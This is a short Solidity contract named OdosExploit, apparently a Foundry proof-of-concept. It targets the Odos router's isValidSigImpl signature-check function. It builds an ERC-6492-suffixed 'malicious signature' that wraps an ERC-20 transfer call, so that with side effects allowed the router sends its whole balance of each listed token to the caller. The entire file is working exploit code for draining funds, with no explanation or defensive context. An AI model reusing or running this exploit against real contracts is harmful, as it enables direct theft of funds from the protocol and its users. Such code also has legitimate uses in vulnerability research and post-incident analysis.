// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

interface IOdosRouter {
    function isValidSigImpl(address _signer, bytes32 _hash, bytes calldata _signature, bool allowSideEffects)
        external
        returns (bool);
}

contract OdosExploit {
    bytes32 constant ERC6492_DETECTION_SUFFIX = 0x6492649264926492649264926492649264926492649264926492649264926492;
    bytes4 constant ERC1271_MAGIC_VALUE = 0x1626ba7e;

    function exploit(address odosRouter, address[] memory tokensToSteal) external {
        for (uint256 i; i < tokensToSteal.length; ++i) {
            uint256 odosTokenBalance = IERC20(tokensToSteal[i]).balanceOf(odosRouter);
            bytes memory maliciousSignature = abi.encodePacked(
                abi.encode(
                    tokensToSteal[i],
                    abi.encodeWithSelector(IERC20.transfer.selector, msg.sender, odosTokenBalance),
                    abi.encodePacked("0x00")
                ),
                ERC6492_DETECTION_SUFFIX
            );

            IOdosRouter(odosRouter).isValidSigImpl({
                _signer: address(0x4),
                _hash: bytes32(0),
                _signature: maliciousSignature,
                allowSideEffects: true 
            });
        }
    }
}
